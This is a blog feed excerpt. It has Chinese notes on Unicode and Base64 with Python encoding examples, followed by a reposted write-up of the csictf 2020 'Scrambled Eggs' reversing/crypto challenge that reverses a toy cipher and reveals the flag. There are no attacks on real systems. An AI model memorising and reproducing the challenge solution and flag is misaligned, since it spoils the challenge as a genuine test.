href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>）、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A4%9A%E6%A0%BC%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">多格拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%96%AC%E6%B2%BB%E4%BA%9E%E6%96%87">格鲁吉亚文</a>骑士体大写字母、<a href="https://zh.wikipedia.org/w/index.php?title=%E8%B4%A1%E8%B4%BE%E6%8B%89%E8%B4%A1%E5%BE%B7%E6%96%87&amp;action=edit&amp;redlink=1">贡贾拉贡德文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%88%E4%B9%83%E6%96%90%E7%BE%85%E8%88%88%E4%BA%9E%E6%96%87%E5%AD%97">哈乃斐罗兴亚文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%9B%E5%8A%A0%E9%94%A1%E6%96%87&amp;action=edit&amp;redlink=1">望加锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A2%85%E5%BE%B7%E6%B3%95%E4%BC%8A%E5%BE%B7%E6%9E%97%E6%96%87&amp;action=edit&amp;redlink=1">梅德法伊德林文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E7%B2%9F%E7%89%B9%E6%96%87">老粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B2%9F%E7%89%B9%E6%96%87">粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%88%A9%E9%82%81%E6%96%87">埃利迈文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%97%E8%BF%AA%E5%9F%8E%E6%96%87&amp;action=edit&amp;redlink=1">南迪城文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%89%B5%E4%B8%96%E7%B4%80%E8%8B%97%E6%96%87">创世纪苗文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%96%87%E4%B9%94%E6%96%87&amp;action=edit&amp;redlink=1">文乔文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8A%B1%E5%89%8C%E5%AD%90%E6%A8%A1%E8%AF%AD">花剌子模语</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BF%AA%E7%BB%B4%E8%A5%BF%E8%AF%AD">迪维西语</a>的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B3%B6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">岛字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%91%E4%B8%B9%E5%B0%8F%E5%AD%97">契丹小字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">库尔德语字母</a>的<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">Yezidi体</a>、书写<a href="https://zh.wikipedia.org/wiki/%E8%B1%AA%E8%90%A8%E8%AF%AD">豪萨语</a>用的阿拉伯附加字母、<a href="https://zh.wikipedia.org/wiki/%E6%B2%83%E6%B4%9B%E5%A4%AB%E8%AA%9E">沃洛夫语</a>、其他非洲语言、在巴基斯坦书写<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%B0%E5%BE%B7%E7%A7%91%E8%AA%9E&amp;action=edit&amp;redlink=1">印德科语</a>和<a href="https://zh.wikipedia.org/wiki/%E6%97%81%E9%81%AE%E6%99%AE%E8%AA%9E">旁遮普语</a>的补充字符、<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E">粤语</a>用的<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB%E5%89%B5%E6%84%8F">共享创意</a>授权符号、七十或八十年代电讯用图符。</p>
<h3 id="unicode编码系统可分为编码方式和实现方式两个层次">Unicode编码系统可分为编码方式和实现方式两个层次。</h3>
<p>目前实际应用的统一码版本对应于<a href="https://zh.wikipedia.org/wiki/UCS-2">UCS-2</a>，使用16<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">位</a>的编码空间。也就是每个字符占用2个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。<br>
UCS-4是一个更大的尚未填充完全的31位字符集，加上恒为0的首位，共需占据32位，即4字节。理论上最多能表示231个字符，完全可以涵盖一切语言所用的符号。<br>
基本多文种平面的字符的编码为<em>U+hhhh</em>，其中每个<em>h</em>代表一个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数字，与UCS-2编码完全相同。而其对应的4字节UCS-4编码后两个字节一致，前两个字节则所有位均为0。<br>
Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为<strong>Unicod转换格式</strong>（Unicode Transformation Format，简称为UTF）。</p>
<p><a href="https://zh.wikipedia.org/wiki/Unicode">Unicode_wiki百科</a></p>
<h2 id="base64">base64</h2>
<p><strong>Base64</strong>是一种基于64个可打印字符来表示<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制数据</a>的表示方法。由于{\displaystyle \log _{2}64=6}<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9c986fbdc6c036a937e0647d7a6ec5ad745bccab" alt="{\displaystyle \log _{2}64=6}" loading="lazy">，所以每6个<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">比特</a>为一个单元，Base64常用于在通常处理文本<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE">数据</a>的场合，表示、传输、存储一些二进制数据，包括<a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>的<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">电子邮件</a>及<a href="https://zh.wikipedia.org/wiki/XML">XML</a>的一些复杂数据。</p>
<ul>
<li>编码“Man”</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">文本</th>
<th>M</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>A</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>N</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ASCII编码</td>
<td>77</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>97</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>110</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">二进制位</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td style="text-align:center">索引</td>
<td>19</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>22</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>46</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">Base64编码</td>
<td><strong>T</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>W</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>F</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>u</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>在此例中，Base64算法将3个字节编码为4个字符。</p>
<p>Base64索引表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">A</td>
<td style="text-align:center">16</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">32</td>
<td style="text-align:center">g</td>
<td style="text-align:center">48</td>
<td style="text-align:center">w</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">B</td>
<td style="text-align:center">17</td>
<td style="text-align:center">R</td>
<td style="text-align:center">33</td>
<td style="text-align:center">h</td>
<td style="text-align:center">49</td>
<td style="text-align:center">x</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">C</td>
<td style="text-align:center">18</td>
<td style="text-align:center">S</td>
<td style="text-align:center">34</td>
<td style="text-align:center">i</td>
<td style="text-align:center">50</td>
<td style="text-align:center">y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">D</td>
<td style="text-align:center">19</td>
<td style="text-align:center">T</td>
<td style="text-align:center">35</td>
<td style="text-align:center">j</td>
<td style="text-align:center">51</td>
<td style="text-align:center">z</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">E</td>
<td style="text-align:center">20</td>
<td style="text-align:center">U</td>
<td style="text-align:center">36</td>
<td style="text-align:center">k</td>
<td style="text-align:center">52</td>
<td style="text-align:center">0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">F</td>
<td style="text-align:center">21</td>
<td style="text-align:center">V</td>
<td style="text-align:center">37</td>
<td style="text-align:center">l</td>
<td style="text-align:center">53</td>
<td style="text-align:center">1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">G</td>
<td style="text-align:center">22</td>
<td style="text-align:center">W</td>
<td style="text-align:center">38</td>
<td style="text-align:center">m</td>
<td style="text-align:center">54</td>
<td style="text-align:center">2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">H</td>
<td style="text-align:center">23</td>
<td style="text-align:center">X</td>
<td style="text-align:center">39</td>
<td style="text-align:center">n</td>
<td style="text-align:center">55</td>
<td style="text-align:center">3</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">I</td>
<td style="text-align:center">24</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">40</td>
<td style="text-align:center">o</td>
<td style="text-align:center">56</td>
<td style="text-align:center">4</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">J</td>
<td style="text-align:center">25</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">41</td>
<td style="text-align:center">p</td>
<td style="text-align:center">57</td>
<td style="text-align:center">5</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">K</td>
<td style="text-align:center">26</td>
<td style="text-align:center">a</td>
<td style="text-align:center">42</td>
<td style="text-align:center">q</td>
<td style="text-align:center">58</td>
<td style="text-align:center">6</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">L</td>
<td style="text-align:center">27</td>
<td style="text-align:center">b</td>
<td style="text-align:center">43</td>
<td style="text-align:center">r</td>
<td style="text-align:center">59</td>
<td style="text-align:center">7</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">M</td>
<td style="text-align:center">28</td>
<td style="text-align:center">c</td>
<td style="text-align:center">44</td>
<td style="text-align:center">s</td>
<td style="text-align:center">60</td>
<td style="text-align:center">8</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">N</td>
<td style="text-align:center">29</td>
<td style="text-align:center">d</td>
<td style="text-align:center">45</td>
<td style="text-align:center">t</td>
<td style="text-align:center">61</td>
<td style="text-align:center">9</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">O</td>
<td style="text-align:center">30</td>
<td style="text-align:center">e</td>
<td style="text-align:center">46</td>
<td style="text-align:center">u</td>
<td style="text-align:center">62</td>
<td style="text-align:center">+</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">P</td>
<td style="text-align:center">31</td>
<td style="text-align:center">f</td>
<td style="text-align:center">47</td>
<td style="text-align:center">v</td>
<td style="text-align:center">63</td>
<td style="text-align:center">/</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>大致过程：先将文本转为ascii码，再转为8位2进制数，再取其中6位得出对应的十进制数，再通过索引表中转换为字符</p>
<p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个<code>=</code>号，代表补足的字节数。说，当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p>
<h3 id="base64解码">base64解码</h3>
<p><a href="http://tool.chinaz.com/Tools/Base64.aspx">在线解码编码网站</a></p>
<h3 id="base64_python">base64_python</h3>
<h4 id="想将字符串转编码成base64要先将字符串转换成二进制数据">想将字符串转编码成base64,要先将字符串转换成二进制数据</h4>
<pre><code>url = &quot;https://www.cnblogs.com/songzhixue/&quot;
bytes_url = url.encode(&quot;utf-8&quot;)
str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
print(str_url)

b'aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8='
</code></pre>
<h4 id="将base64解码成字符串">将base64解码成字符串</h4>
<pre><code>import base64
url = &quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&quot;
str_url = base64.b64decode(url).decode(&quot;utf-8&quot;)
print(str_url)

'https://www.cnblogs.com/songzhixue/'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Scrambled Eggs (csictf 2020) 转载！！]]></title>
        <id>https://7usai.github.io/post/scrambled-eggs-csictf-2020-zhuan-zai/</id>
        <link href="https://7usai.github.io/post/scrambled-eggs-csictf-2020-zhuan-zai/">
        </link>
        <updated>2020-09-09T15:40:51.000Z</updated>
        <content type="html"><![CDATA[<h1 id="scrambled-eggs-csictf-2020-转载自httpsctftimeorg">Scrambled Eggs (csictf 2020) 转载自https://ctftime.org/</h1>
<h2 id="转载-用于个人学习">转载！！！ 用于个人学习</h2>
<h2 id="challenge-description">Challenge description</h2>
<blockquote>
<p>I like my eggs sunny side up, but I ended up scrambling them.</p>
</blockquote>
<p>In this <strong>reversing</strong>/<strong>crypto</strong> challenge, we are provided with two files : [scrambledeggs.txt](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/scrambledeggs.txt) which contains two encrypted keys and the encrypted flag, and [scrambledeggs.py](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/scrambledeggs.py) the python script that was used to encrypt the flag.</p>
<p><strong>scrambledeggs.txt</strong> :</p>
<pre><code>Encrytped key1 = xtfsyhhlizoiyx                                                                                                                  
Encrypted key2 = eudlqgluduggdluqmocgyukhbqkx                                                                                                    
Encrypted flag = lvvrafwgtocdrdzfdqotiwvrcqnd
</code></pre>
<p><strong>scrambledeggs.py</strong> :</p>
<pre><code class="language-python">import random 
import sys

map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']

flag = 'csictf{this_is_a_fake_flag}'
flag = flag.replace('{','a')
flag = flag.replace('}','a')
flag = flag.replace('_','b')
key1 = 'ashikka_is_mine'
key1 = key1.replace('_','b')

if(len(flag) != 28 or len(key1) != 14):
    exit()
    
flag = list(flag)
key1 = list(key1)


def enc1(text):
    n = random.randint(0,sys.maxsize%28)
    return text[n:] + text[:n]
    
flag = enc1(flag)
    
def enc2(text):
    temp = ''
    for i in text:
        temp += map[ord(i)-ord('a')]
    return temp

key2 = enc2(enc2(key1))
key2 = list(key2)

for j in range(2):
    for i in range(14):
        temp1 = flag[i]
        flag[i] = flag[(ord(key1[i])-ord('a'))%28] 
        flag[(ord(key1[i])-ord('a'))%28] = temp1
        temp2 = key1[i]
        key1[i] = key1[(ord(key2[i])-ord('a'))%14] 
        key1[(ord(key2[i])-ord('a'))%14] = temp2
        
        
    for i in range(14,28):
        temp1 = flag[i]
        flag[i] = flag[(ord(key2[i-14])-ord('a'))%28] 
        flag[(ord(key2[i-14])-ord('a'))%28] = temp1
        temp2 = key2[i-14]
        key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14] 
        key2[(ord(key1[i-14])-ord('a'))%14] = temp2
        

l = random.sample([key1, key2], 2)
key1 = l[0]
key2 = l[1]

k = ''
for i in range(14):
    k += random.choice(map)
k = list(k)

key2 = k+key2
for i in range(14):
    a = ord(k[i])-ord('a')+ord(key2[i+14])
    if a&gt;122:
        a=a%122
        a=a+97
    key2[i+14]= chr(a)

flag = ''.join(flag)
key1 = ''.join(key1)
key2 = ''.join(key2)
 
key2 = enc2(key2)
flag= enc1(enc1(enc1(enc2(flag))))

print('Encrytped key1 = '+key1)
print('Encrypted key2 = '+key2)
print('Encrypted flag = '+flag)
</code></pre>
<h2 id="approach-to-the-solution">Approach to the solution</h2>
<h3 id="understanding-the-script">Understanding the script</h3>
<p>After calmly reading and trying to understand the script above, we can summarize its steps as the following points :</p>
<ul>
<li>we start off with the assignment of <code>flag</code> and <code>key1</code> (which both are not the actual ones obviously)</li>
</ul>
<pre><code class="language-python">flag = 'csictf{this_is_a_fake_flag}'
flag = flag.replace('{','a')
flag = flag.replace('}','a')
flag = flag.replace('_','b')
key1 = 'ashikka_is_mine'
key1 = key1.replace('_','b')
</code></pre>
<ul>
<li><code>flag</code> is encrypted using the <code>enc1</code> function</li>
</ul>
<pre><code class="language-python">flag = enc1(flag)
</code></pre>
<ul>
<li><code>key2</code> is assigned as the double encryption of <code>key1</code> using the <code>enc2</code> function</li>
</ul>
<pre><code class="language-python">key2 = enc2(enc2(key1))
</code></pre>
<ul>
<li>then comes the big double loop, which simply makes a few swaps between the characters of <code>flag</code>, <code>key1</code> and <code>key2</code></li>
</ul>
<pre><code class="language-python">for j in range(2):
    for i in range(14):
        temp1 = flag[i]
        flag[i] = flag[(ord(key1[i])-ord('a'))%28] 
        flag[(ord(key1[i])-ord('a'))%28] = temp1
        temp2 = key1[i]
        key1[i] = key1[(ord(key2[i])-ord('a'))%14] 
        key1[(ord(key2[i])-ord('a'))%14] = temp2
        
        
    for i in range(14,28):
        temp1 = flag[i]
        flag[i] = flag[(ord(key2[i-14])-ord('a'))%28] 
        flag[(ord(key2[i-14])-ord('a'))%28] = temp1
        temp2 = key2[i-14]
        key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14] 
        key2[(ord(key1[i-14])-ord('a'))%14] = temp2
</code></pre>
<ul>
<li>after that, there is a possibility that <code>key1</code> and <code>key2</code> are swapped</li>
</ul>
<pre><code class="language-python">l = random.sample([key1, key2], 2)
key1 = l[0]
key2 = l[1]
</code></pre>
<ul>
<li>random characters are appended to <code>key2</code>, and using those characters <code>key2</code>'s characters are modified</li>
</ul>
<pre><code class="language-python">k = ''
for i in range(14):
    k += random.choice(map)
k = list(k)

key2 = k+key2
for i in range(14):
    a = ord(k[i])-ord('a')+ord(key2[i+14])
    if a&gt;122:
        a=a%122
        a=a+97
    key2[i+14]= chr(a)
</code></pre>
<ul>
<li><code>key2</code> is encrypted using the <code>enc2</code> function</li>
</ul>
<pre><code class="language-python">key2 = enc2(key2)
</code></pre>
<ul>
<li><code>flag</code> is encrypted using the <code>enc2</code> function, and then encrypted three times using the <code>enc1</code> function</li>
</ul>
<pre><code class="language-python">flag= enc1(enc1(enc1(enc2(flag))))
</code></pre>
<ul>
<li>finally <code>key1</code>, <code>key2</code> and <code>flag</code> are printed</li>
</ul>
<pre><code class="language-python">print('Encrytped key1 = '+key1)
print('Encrypted key2 = '+key2)
print('Encrypted flag = '+flag)
</code></pre>
<h3 id="how-to-approach-this">How to approach this ?</h3>
<p>The general approach to take for this type of challenges is to first start by identifying and dividing the big individual problems/steps and come up with solutions for them if possible, then we procede to reverse each step starting from the bottom heading to the top, and we have to make sure to mark the steps where different values could come up, in our case, these are the steps where random values are used. Since we cannot guess those values, we use brute force by computing all the possible combinations.</p>
<p>So first, let's start by identifying the steps where brute force is needed and where not :</p>
<ul>
<li>the <code>enc1</code> function uses random values to determine where to split the <code>text</code> argument, that means brute force is required</li>
</ul>
<pre><code class="language-python">def enc1(text):
    n = random.randint(0,sys.maxsize%28)
    return text[n:] + text[:n]
</code></pre>
<ul>
<li>the <code>enc2</code> function simply maps characters from <code>text</code> to the <code>map</code> defined at the top of the script, so we can &quot;undo&quot; that</li>
</ul>
<pre><code class="language-python">map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']
def enc2(text):
    temp = ''
    for i in text:
        temp += map[ord(i)-ord('a')]
    return temp
</code></pre>
<ul>
<li>the big double loop looks daunting but it is easily reversible by litteraly reversing the steps</li>
<li>the key swapping is out of our control, we have to consider the two cases where <code>key1</code> and <code>key2</code> are swapped and when they are not</li>
<li>the part where random characters are mixed with <code>key2</code> aspires that we need to use brute force, but we will find out later that we can actually recover <code>key2</code> without using brute force</li>
</ul>
<h2 id="crafting-the-solution">Crafting the solution</h2>
<p>Now that we have identified the major steps of the encryption and the steps that require brute force, we can begin writing the solution. We will start off by writing some functions that will help us reverse some steps.</p>
<h3 id="reversing-enc1">reversing <code>enc1</code></h3>
<p>The <code>enc1</code> function generates first a random number <code>n</code> using <code>random.randint(0, sys.maxsize%28)</code>, <code>sys.maxsize</code> refers to the platform's pointer size, for 64-bit machines that's <code>2**63-1</code>, therefore, if we assume that the machine used to run the script is 64-bit <code>sys.maxsize%28</code> evaluates to <code>7</code>.</p>
<p>Since we can't guess the random numbers generated, we will simply define the reverse function <code>dec1</code> to take two arguments <code>text</code> and <code>n</code> :</p>
<pre><code class="language-python">def dec1(text, n):
    assert(0 &lt;= n &lt; 28)
    return text[-n:] + text[:-n]
</code></pre>
<p>Then in our main function, we will make sure to generate all the possible values for <code>n</code> (0 to 7)</p>
<h3 id="reversing-enc2">reversing <code>enc2</code></h3>
<p>On the other hand <code>enc2</code> is easily reversible by remapping the characters of <code>text</code> like this :</p>
<pre><code class="language-python">def dec2(text):
    # map each character of text to the character of order :
    # index of text[i] in scramble_map + ord('a')
    return ''.join(chr(scramble_map.index(char) + ord('a')) for char in text)
</code></pre>
<h3 id="unlooping">unlooping</h3>
<p>As stated before, we reverse the big double loop by simply reversing the steps, just like this :</p>
<pre><code class="language-python">def unloop(key1, key2, flag):
    key1, key2, flag = list(key1), list(key2), list(flag)
    assert (len(key1) == len(key2) == 14)
    for j in range(2):
        # we make sure the range is from 27 to 14, not 14 to 27
        for i in range(27, 13, -1):
            # taking advantage of python's built-in way to swap values
            # rather than using a temp variable
            index = (ord(key1[i-14]) - ord('a')) % 14
            key2[index], key2[i-14] = key2[i-14], key2[index]

            index = (ord(key2[i-14]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

        for i in range(13, -1, -1):
            index = (ord(key2[i]) - ord('a')) % 14
            key1[index], key1[i] = key1[i], key1[index]

            index = (ord(key1[i]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

    return ''.join(key1), ''.join(key2), ''.join(flag)
</code></pre>
<h3 id="recovering-key2">recovering <code>key2</code></h3>
<p>We said before that the part where 14 random characters were mixed up with <code>key2</code> is reversible without brute force, that's because those random chars are appended to <code>key2</code> and not scrambled afterwards, so here are the steps to recover <code>key2</code> :</p>
<pre><code class="language-python">def recover_key2(ekey2):
    assert(len(ekey2) == 28)
    # the random characters are the 14 first
    k = ekey2[:14]
    # the list of `a`s
    alist = list(map(ord, ekey2[14:]))
    res = ''
    for i in range(14):
        # we simply compute c using linear equations
        c = alist[i] - ord(k[i]) + ord('a')
        # since all characters are ascii lowercase
        # this check helps avoiding multiple potential values
        if not ord('a') &lt;= c &lt;= ord('z'):
            c += 122 - 97
        res += chr(c)
    return res
</code></pre>
<h3 id="wrapping-everything-up">Wrapping everything up</h3>
<p>In order to join everything we have been working on, we simply reverse the steps of the total encryption from bottom to top :</p>
<ol>
<li>Generate combinations of three <code>n</code>s (from 0 to 7)</li>
</ol>
<pre><code class="language-python">randsize = 7
combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
</code></pre>
<ol>
<li>Use the combinations to call <code>dec1</code> three times on the encrypted flag, and then call <code>dec2</code> (we can call <code>dec2</code> first since <code>dec1</code> doesn't change the characters of <code>text</code>)</li>
</ol>
<pre><code class="language-python">flag = dec2(eflag)
for c in combinations:
    flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
</code></pre>
<ol>
<li>Call <code>dec2</code> on the encrypted <code>key2</code></li>
</ol>
<pre><code class="language-python">key2 = dec2(ekey2)
</code></pre>
<ol>
<li>Recover <code>key2</code> using <code>recover_key2</code></li>
</ol>
<pre><code class="language-python">key2 = recover_key2(key2)
</code></pre>
<ol>
<li>Choose whether to swap <code>key1</code> and <code>key2</code> or not</li>
</ol>
<pre><code class="language-python">swapkeys = True
if swapkeys: key1, key2 = key2, key1
</code></pre>
<ol>
<li>Undo the big double loop using <code>unloop</code></li>
</ol>
<pre><code class="language-python">key1, key2, flag = unloop(key1, key2, flag)
</code></pre>
<ol>
<li>Since originally, before the loop, <code>key2</code> is equal to <code>enc2(enc2(key1))</code> we can check whether that is true to minimize the results</li>
</ol>
<pre><code class="language-python">if dec2(dec2(key2)) == key1:
</code></pre>
<ol>
<li>Once again we generate <code>n</code>s to decrypt <code>flag</code> with <code>dec1</code></li>
</ol>
<pre><code class="language-python">for n in range(randsize + 1):
    flag = dec1(flag, n)
    results.append(flag)
</code></pre>
<ol>
<li>Finally, we can store all the resulting flags in a file named &quot;results.txt&quot;, so that we can check out if it contains the actual correct flag</li>
</ol>
<pre><code class="language-python">outfile = 'results.txt'
with open(outfile, 'w') as f:
    f.write('\n'.join(results))
    f.close()
</code></pre>
<p><strong>Note</strong> : steps 3, 4 and 5 can be done before generating the combinations since those combinations affect only <code>flag</code></p>
<h3 id="the-main-function">The main function</h3>
<pre><code class="language-python">combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
key1 = ekey1
key2 = recover_key2(dec2(ekey2))
flag = dec2(eflag)
if swapkeys: key1, key2 = key2, key1
original = flag, key1, key2
results = []
for c in combinations:
    flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
    key1, key2, flag = unloop(key1, key2, flag)
    if dec2(dec2(key2)) == key1:
        for n in range(randsize + 1):
            flag = dec1(flag, n)
            results.append(flag)
    flag, key1, key2 = original
with open(outfile, 'w') as f:
    f.write('\n'.join(results))
    f.close()
</code></pre>
<p>The full script is [here](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/solve.py)</p>
<h2 id="unscrambled-eggs">Unscrambled Eggs</h2>
<p>On the first try, when <code>swapkeys</code> is set to <code>False</code>, &quot;results.txt&quot; turns out to be empty. But then after setting that to <code>True</code>, the file is quite populated, that could mean that we've been successful.</p>
<p><code>grep &quot;^csictf&quot; results.txt</code> :</p>
<figure data-type="image" tabindex="1"><img src="https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf%202020-Scrambled%20Eggs/img/grep1.png" alt="grep &quot;^csictf&quot; results.txt" loading="lazy"></figure>
<p>Hmmm.. we get nothing</p>
<p><code>grep &quot;csictf&quot; results.txt</code> :</p>
<figure data-type="image" tabindex="2"><img src="https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf%202020-Scrambled%20Eggs/img/grep2.png" alt="grep &quot;csictf&quot; results.txt" loading="lazy"></figure>
<p>Ah ! we get some results now, if we replace some <code>a</code>s and <code>b</code>s to <code>{</code>, <code>}</code> and <code>_</code> in <code>sacsictfaallbthebkingsbhorse</code> we can read <code>s}csictf{all_the_kings_horse</code>.</p>
<p>It is trivial now that the <strong>flag</strong> is :</p>
<pre><code>csictf{all_the_kings_horses}
</code></pre>
<h2 id="the-full-script">The full script</h2>
<pre><code>#!/usr/bin/env python3
import itertools

# encrypted key1, key2 and flag (from scrambledeggs.txt)
